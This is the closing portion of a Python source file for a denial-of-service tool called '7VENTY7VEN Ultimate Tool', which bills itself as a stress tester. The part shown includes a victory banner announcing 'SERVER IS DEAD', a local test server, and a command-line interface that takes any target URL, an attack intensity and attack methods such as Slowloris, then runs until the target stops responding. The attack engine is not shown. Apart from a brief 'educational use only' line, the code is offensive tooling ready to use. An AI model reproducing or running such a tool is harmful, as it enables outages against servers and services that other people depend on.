{Colors.RED}╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
        print(banner)
    
    def print_death_finale(self):
        """Print death finale"""
        elapsed = time.time() - self.start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        finale = f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║                 💀💀💀 VICTORY! SERVER IS DEAD 💀💀💀                 ║
║                                                                   ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  🎯 FINAL HITS:        {self.hit_tracker.hit_count:<8}                              ║
║  ⏱️  TIME TO DEATH:    {minutes}m {seconds}s                                      ║
║  ⚡ AVERAGE HIT RATE:  {self.hit_tracker.hit_count/elapsed:.1f}/s                                 ║
║  🐌 SLOWLORIS HITS:    {self.stats.get('SLOWLORIS',0):<8}                              ║
║  📦 TOTAL PACKETS:     {self.stats['total']:<8}                              ║
║  ❌ TOTAL ERRORS:      {self.stats['errors']:<8}                              ║
║                                                                   ║
╠═══════════════════════════════════════════════════════════════════╣
║                    📊 FINAL HIT BREAKDOWN                        ║
╠═══════════════════════════════════════════════════════════════════╣
"""
        
        # Add hit breakdown
        hit_summary = self.hit_tracker.get_summary()
        for method, count in hit_summary.items():
            percentage = (count / self.hit_tracker.hit_count * 100) if self.hit_tracker.hit_count > 0 else 0
            bar = '█' * int(percentage / 5) + '░' * (20 - int(percentage / 5))
            finale += f"║  {method:<12}: {count:>6} hits [{bar}] {percentage:>5.1f}%      ║\n"
        
        finale += f"""
╠═══════════════════════════════════════════════════════════════════╣
║                    📋 LAST 10 HITS                               ║
╠═══════════════════════════════════════════════════════════════════╣
"""
        
        # Show last 10 hits
        for hit in self.hit_tracker.hits[-10:]:
            ip_part = hit['target'].replace('.', '[.]')
            finale += f"║  [{hit['time_str']}] #{hit['id']} → {ip_part}[:{hit['port']}] ({hit['attack_type']})║\n"
        
        finale += f"""
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  🔥 MISSION COMPLETE - SERVER DESTROYED! 🔥                       ║
║  ⚡ 7VENTY7VEN'S ULTIMATE TOOL - FIXED SLOWLORIS ⚡                ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
        print(finale)

# ==================== TEST SERVER ====================
class TestServer:
    """Simple test server that can be killed"""
    
    def __init__(self, port=8080):
        self.port = port
        self.running = False
        self.server = None
        self.hit_count = 0
        self.start_time = None
        
    def start(self):
        """Start the test server"""
        self.running = True
        self.start_time = time.time()
        
        def handle_client(client_socket, address):
            """Handle client connection"""
            self.hit_count += 1
            try:
                request = client_socket.recv(1024).decode()
                
                # Simple response
                response = f"""HTTP/1.1 200 OK
Content-Type: text/html
Server: TestServer/1.0
Hit-Count: {self.hit_count}

<html>
<head><title>Test Server</title></head>
<body>
<h1>Test Server Running!</h1>
<p>Hits: {self.hit_count}</p>
<p>Uptime: {int(time.time() - self.start_time)} seconds</p>
<p>Your IP: {address[0]}</p>
</body>
</html>
"""
                client_socket.send(response.encode())
            except:
                pass
            finally:
                client_socket.close()
        
        def run_server():
            """Run the server"""
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind(('0.0.0.0', self.port))
            self.server.listen(100)
            
            print(f"{Colors.GREEN}[+] Test server started on port {self.port}{Colors.END}")
            print(f"{Colors.GREEN}[+] Hit it with: python3 1.py -t http://localhost:{self.port}/ -i ultimate -m SLOWLORIS{Colors.END}")
            print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop server{Colors.END}")
            
            while self.running:
                try:
                    client, address = self.server.accept()
                    thread = threading.Thread(target=handle_client, args=(client, address))
                    thread.daemon = True
                    thread.start()
                except:
                    break
        
        thread = threading.Thread(target=run_server)
        thread.daemon = True
        thread.start()
        return thread
    
    def stop(self):
        """Stop the test server"""
        self.running = False
        if self.server:
            self.server.close()
        print(f"{Colors.RED}[!] Test server stopped. Total hits: {self.hit_count}{Colors.END}")

# ==================== MAIN EXECUTION ====================
def main():
    """Perfect main function"""
    
    def signal_handler(sig, frame):
        print(f"\n{Colors.YELLOW}[!] Received interrupt signal{Colors.END}")
        if 'hammer' in globals():
            hammer.running = False
            hammer.cleanup()
        if 'test_server' in globals() and test_server:
            test_server.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    parser = argparse.ArgumentParser(description='7VENTY7VEN Ultimate Tool v14.0', add_help=False)
    parser.add_argument('-t', '--target', help='Target URL (e.g., http://example.com)')
    parser.add_argument('-i', '--intensity', default='ultimate', 
                       choices=['low', 'medium', 'high', 'seven', 'ultimate'],
                       help='Attack intensity (default: ultimate)')
    parser.add_argument('-m', '--methods', nargs='+',
                       choices=[m.name for m in AttackMethod],
                       help='Specific attack methods to use')
    parser.add_argument('--list-methods', action='store_true', help='List all available attack methods')
    parser.add_argument('--save-hits', action='store_true', help='Save hit log to JSON file')
    parser.add_argument('--start-server', action='store_true', help='Start a test server')
    parser.add_argument('--server-port', type=int, default=8080, help='Test server port (default: 8080)')
    parser.add_argument('-h', '--help', action='store_true', help='Show help')
    
    args = parser.parse_args()
    
    if args.start_server:
        global test_server
        test_server = TestServer(port=args.server_port)
        test_server.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            test_server.stop()
        return
    
    if args.list_methods:
        print(f"\n{Colors.CYAN}Available Attack Methods:{Colors.END}\n")
        for method in AttackMethod:
            config = method.value
            root_req = "🔴 Requires Root" if config.requires_root else "✅ No Root Required"
            print(f"{Colors.GREEN}• {method.name:<12}{Colors.END} - {config.description:<30} {Colors.YELLOW}[{root_req}]{Colors.END}")
        print()
        return
    
    if args.help or not args.target:
        print(f"""
{Colors.CYAN}7VENTY7VEN'S ULTIMATE STRESS TESTER v14.0 - FIXED SLOWLORIS{Colors.END}
{Colors.PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}

{Colors.GREEN}USAGE:{Colors.END}
  python3 1.py -t <target> -i <intensity> [options]
  python3 1.py --start-server              (Start test server)

{Colors.YELLOW}TARGET EXAMPLES:{Colors.END}
  http://localhost:8080/     (Local test server)
  http://example.com         (Web server)
  https://example.com        (HTTPS server)

{Colors.MAGENTA}INFINITE MODE:{Colors.END}
  Runs FOREVER until the server dies!
  Automatic death detection at 10 consecutive errors

{Colors.CYAN}OPTIONS:{Colors.END}
  -t, --target TARGET     Target URL
  -i, --intensity         Attack intensity (low/medium/high/seven/ultimate)
  -m METHOD1 METHOD2 ...  Specific attack methods
  --list-methods         List all available methods
  --save-hits            Save hit log to JSON file
  --start-server         Start a test server
  --server-port PORT     Test server port (default: 8080)
  -h, --help             Show this help

{Colors.PURPLE}EXAMPLES:{Colors.END}
  # Start a test server
  python3 1.py --start-server
  
  # Attack with Slowloris only (NOW FIXED!)
  python3 1.py -t http://localhost:8080/ -i ultimate -m SLOWLORIS
  
  # Attack with all methods
  python3 1.py -t http://localhost:8080/ -i ultimate

{Colors.RED}🐌 SLOWLORIS IS NOW FIXED!{Colors.END}
  • Maintains hundreds of connections
  • Sends headers every 10 seconds
  • Shows active connection count
  • Works perfectly with test server

{Colors.RED}⚠️  EDUCATIONAL USE ONLY - TEST YOUR OWN SERVERS{Colors.END}
        """)
        return
    
    # Fix target
    if not args.target.startswith(('http://', 'https://')):
        args.target = f"http://{args.target}"
    
    # Create and run
    global hammer
    hammer = UltimateHammer()
    
    try:
        hammer.infinite_combo(args.target, args.intensity, args.methods)
    except Exception as e:
        hammer.error_handler.log(ErrorLevel.CRITICAL, f"Unexpected error: {e}")
    finally:
        hammer.cleanup()

if __name__ == "__main__":
    main()
